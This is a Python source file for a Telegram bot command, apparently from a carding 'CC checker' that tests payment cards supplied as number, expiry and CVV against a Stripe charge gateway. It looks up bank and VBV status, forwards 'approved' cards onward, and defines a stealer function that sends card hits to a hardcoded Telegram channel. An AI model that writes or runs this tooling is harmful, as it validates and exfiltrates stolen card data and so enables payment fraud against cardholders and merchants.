import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Replace with your actual channel ID
STEALER_CHANNEL_ID = -1002549777556

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("au", [".", "/"]))
async def stripe_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Stripe Auth 💎"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /au

Message: No CC Found in your input ❌

Usage: /au cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]  # BIN for easy reference

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        sks = await getallsk()
        result = await create_cvv_charge(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)

        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"
# VBV BIN check: get full descriptive message from vbvbin.txt
        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
            bin_found = False
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] == bin6:
                    bin_found = True
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    break
            if not bin_found:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "Live ✨"
        start = time.time()

        # your process...

        end = time.time()
        elapsed_time = round(end - start, 2)

        finalresp = f"""
[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>
[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}
[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}

━━━〔 INFO 〕━━━
[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}
[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}
[〄] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔⟶ {country} {flag}

━━━〔 META 〕━━━
[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}
[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s
[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> {role} 

━━━〔 OWNER 〕━━━
<a href="tg://user?id=8340881349">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>
"""

        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
